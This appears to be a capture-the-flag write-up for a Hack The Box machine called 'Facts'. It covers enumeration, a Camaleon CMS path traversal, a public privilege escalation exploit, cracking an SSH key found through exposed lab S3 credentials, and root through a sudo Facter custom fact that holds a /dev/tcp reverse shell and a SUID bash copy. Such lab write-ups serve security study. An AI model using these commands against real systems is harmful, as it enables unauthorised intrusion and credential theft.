# FACTS -- LINUX


---

## ENUMERATION

---
#### NMAP

```
sudo nmap -Pn -sCV 10.129.21.39 -vv --min-rate 8888 -oN tcp.nmap
```

<img width="640" height="252" alt="image" src="https://github.com/user-attachments/assets/a1748172-71cb-4652-a054-566a3d086b1e" />


---
#### FEROXBUSTER

```
feroxbuster -u http://facts.htb -w /usr/share/secLists/Discovery/Web-Content/raft-large-words.txt -ac
```

<img width="969" height="327" alt="image" src="https://github.com/user-attachments/assets/f886c9eb-e8aa-4fb8-abd7-6a15ee40a888" />

`/admin` and `/robots` look interesting


---
#### WEB PORTAL


- found `/sitemap` from `/robots`

<img width="619" height="654" alt="image" src="https://github.com/user-attachments/assets/01d634b8-fbf1-4ef3-b547-2aad4f9fdc20" />

- found `/admin`

- attempted `admin:admin`

- attempted simple SQLi

- create a new account

- once logged in with our creds -- we appear to drop in admin portal just like that -- but we're likely still a regular user

<img width="890" height="324" alt="image" src="https://github.com/user-attachments/assets/5bde3f6f-2d58-4546-8316-fdad005476c6" />

//we got our token

<img width="1000" height="203" alt="image" src="https://github.com/user-attachments/assets/17e2d6a4-24f9-40a7-ba75-4de8e04733b5" />

//then at the bottom of the page we notice a potential application and version the site is running

<img width="1278" height="54" alt="image" src="https://github.com/user-attachments/assets/c6a21d80-f214-41f9-986f-a4bbdce27653" />



---
## EXPLOITATION


---
#### GOOGLE 


- google `camaleon cms 2.9.0`


- found `https://www.exploit-db.com/exploits/52531`


<img width="568" height="196" alt="image" src="https://github.com/user-attachments/assets/5bdbb4aa-6144-46cc-b651-99a5ad9da65c" />


- then try the path traversal as shown in the poc

```
http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd
```


- and it downloads the file we specified -- in this case `/etc/passwd`


<img width="1258" height="613" alt="image" src="https://github.com/user-attachments/assets/5e81684b-1468-407e-a9ff-565881582b75" />


- and found potential users


<img width="438" height="61" alt="image" src="https://github.com/user-attachments/assets/8efd4326-8237-45d3-bef3-2520efbc88d4" />


- in profile we can see that we're still a regular user and not admin
- our role is not changable
- so fire up devtools -- and locate the role field

<img width="624" height="482" alt="image" src="https://github.com/user-attachments/assets/6251bc5c-5f1b-47e9-b2b9-06f50a61c1d8" />

- simply remove `disabled="disabled"`
- and we can now change role to admin

<img width="724" height="425" alt="image" src="https://github.com/user-attachments/assets/2c092263-5834-420d-8176-dade5f2a1583" />

- unfortunately once we update the role -- we're reverted back to regular user


---
#### CVE-2025-2304 - Camaleon CMS 2.9.0 - Privilege Escalation Exploit

- google again for `Camaleon cms 2.9.0` and found `https://github.com/CsuriBird/CVE-2025-2304`


<img width="872" height="329" alt="image" src="https://github.com/user-attachments/assets/c5407c7b-4c87-439d-9b1c-358122ed12a0" />


- `git clone` it
- then create a python venv

```
python3 -m venv htb-facts
```
```
source htb-facts/bin/activate
```


//now install dependencies 

```
pip install -r requirements.txt
```

- and run the exploit
- note that we need to create a user beforehand

```
python camaleon_cms_privilege_escalation.py \
    --url http://facts.htb \
    --username 'e8ht' \   
    --password 'mypass' \    
    --new-password newadminpass
```

<img width="639" height="472" alt="image" src="https://github.com/user-attachments/assets/577c4868-62f4-485d-9d03-56e61d036d63" />


//here we logged in and got a full-on admin dashboard with plugins tab -- potentially our way in

<img width="1509" height="563" alt="image" src="https://github.com/user-attachments/assets/019c4160-08e1-4cc6-88dd-7ecd3ab87da1" />


- found aws s3 access and secret key `AKIABB2D881C7718AFB9` : `NKAELkLXxKU2Y9XH/pKjH0//TmpGzHeS+RrirqWg`
- note the endpoint port 54321

<img width="873" height="556" alt="image" src="https://github.com/user-attachments/assets/b065ca97-495d-4ec4-96b9-c1b9e478796c" />

//we could also potentially try and upload icon image and screenshot photo



---
#### AWSCLI

```
sudo apt install awscli -y
```
```
aws configure --profile htb-facts
```

//then enter the access and secret key


<img width="514" height="102" alt="image" src="https://github.com/user-attachments/assets/2ce76aa8-1f7a-4bd4-822f-f1d52e0fa302" />


```
aws s3 ls --profile htb-facts --endpoint-url http://facts.htb:54321
```
```
aws s3 --profile htb-facts --endpoint-url http://facts.htb:54321 ls internal
```
<img width="584" height="225" alt="image" src="https://github.com/user-attachments/assets/8de2e0b5-8a4a-4512-bcbd-0dd95958136c" />


//of course we need to check ssh key

```
aws s3 --profile htb-facts --endpoint-url http://facts.htb:54321 ls internal/.ssh/

```

//then download it

```
aws s3 --profile htb-facts --endpoint-url http://facts.htb:54321 cp s3://internal/.ssh/id_ed25519 id_ed25519-facts
```

<img width="643" height="152" alt="image" src="https://github.com/user-attachments/assets/686d2f83-9a81-40c2-8f8f-3e337d509ba1" />


- earlier we found 2 potential users: trivia and william
- will try trivia first
- make sure to chmod the key first

```
chmod 600 id_ed25519-facts
```
```
ssh -i id_ed25519-facts trivia@10.129.21.39
```

//apparently the key is encrypted

<img width="392" height="153" alt="image" src="https://github.com/user-attachments/assets/73108857-6234-45b7-828b-5a394a16e5c3" />



---
#### SSH2JOHN && JOHN

```
ssh2john id_ed25519-facts > id_ed25519-facts.john
```
```
john id_ed25519-facts.john --wordlist=/usr/share/wordlists/rockyou.txt
```
//and it cracked it: `dragonballz`

<img width="639" height="212" alt="image" src="https://github.com/user-attachments/assets/31d18aeb-7441-46ee-9d9f-25e698f48bae" />



---
#### SSH


```
ssh -i id_ed25519-facts trivia@10.129.21.39 -q
```

- and finally we're in
- note that user.txt is not in trivia's /home

<img width="475" height="453" alt="image" src="https://github.com/user-attachments/assets/d0894ee2-5370-4614-8744-6a6b575e3eec" />


//and we got user.txt in /home/williams

<img width="533" height="159" alt="image" src="https://github.com/user-attachments/assets/12f7eb39-fea1-4b1a-aeec-f5ee1830f5ac" />



---
## PRIVESC


```
sudo -l
```

<img width="638" height="140" alt="image" src="https://github.com/user-attachments/assets/010c9599-5cde-4d07-8f06-1d39d4fb9d68" />



---
#### FACTER



```
/usr/bin/facter -h
```

<img width="637" height="627" alt="image" src="https://github.com/user-attachments/assets/12666bd1-0a0a-413a-b6be-9da9a2e00580" />


//check gtfobins


<img width="881" height="669" alt="image" src="https://github.com/user-attachments/assets/3308cf74-fae0-423e-bb86-0f50ec4de387" />


//also found this github `https://github.com/puppetlabs/puppet-docs/blob/master/source/facter/2.4/custom_facts.markdown`


1. so first we create a fact file in /tmp as shown in the github page above
2. good practice is actually to try and do something simple first -- like creating a file
3. however here we create another bash binary with suid -- also a rev shell just in case

```
Facter.add('pwn') do
  setcode do
    Facter::Core::Execution.exec('cp /bin/bash /home/william/bash; chmod +s /home/william/bash; /bin/bash -i >& /dev/tcp/10.10.14.xxx/8888 0>&1')
    'en route to root'
  end
end
```

4. note that we use /home/william as opposed to /dev/shm or /tmp because `nosuid` is set -- check via `mount | grep /dev/shm`

   
<img width="404" height="33" alt="image" src="https://github.com/user-attachments/assets/cde97325-f934-4da3-a862-6d56ded38280" />


5. then we run facter with sudo -- and finally got our suid bash -- and root

```
sudo facter --custom-dir /tmp/ pwn
```
```
/home/william/bash -p
```

<img width="619" height="99" alt="image" src="https://github.com/user-attachments/assets/b278a1af-efb1-4553-93bf-218b754e2ad6" />


